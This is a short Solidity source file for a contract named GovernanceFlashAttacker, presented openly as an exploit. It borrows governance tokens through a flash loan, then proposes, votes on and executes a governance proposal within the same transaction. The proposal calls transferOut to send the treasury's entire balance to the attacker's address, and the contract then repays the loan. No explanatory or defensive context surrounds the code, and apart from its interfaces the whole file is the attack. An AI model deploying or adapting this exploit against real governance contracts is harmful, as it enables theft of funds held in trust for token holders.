// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IGovToken {
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IGovernor {
    function propose(address target, bytes calldata data) external returns (uint256 id);
    function vote(uint256 id) external;
    function execute(uint256 id) external;
}

interface IFlashLender {
    function flashLoan(uint256 amount, bytes calldata data) external;
}

interface IFlashBorrower {
    function onFlashLoan(uint256 amount, bytes calldata data) external;
}

contract GovernanceFlashAttacker is IFlashBorrower {
    IGovernor public immutable governor;
    address public immutable treasury;
    IFlashLender public immutable lender;
    IGovToken public immutable govToken;
    address public immutable owner;

    constructor(address _governor, address _treasury, address _lender, address _govToken) {
        governor = IGovernor(_governor);
        treasury = _treasury;
        lender = IFlashLender(_lender);
        govToken = IGovToken(_govToken);
        owner = msg.sender;
    }

    function attack(uint256 flashAmount) external {
        lender.flashLoan(flashAmount, "");
    }

    function onFlashLoan(uint256 amount, bytes calldata) external override {
        bytes memory maliciousCall = abi.encodeWithSignature(
            "transferOut(address,uint256)",
            owner,
            treasury.balance
        );

        uint256 id = governor.propose(treasury, maliciousCall);
        governor.vote(id);
        governor.execute(id);

        govToken.transfer(address(lender), amount);
    }
}
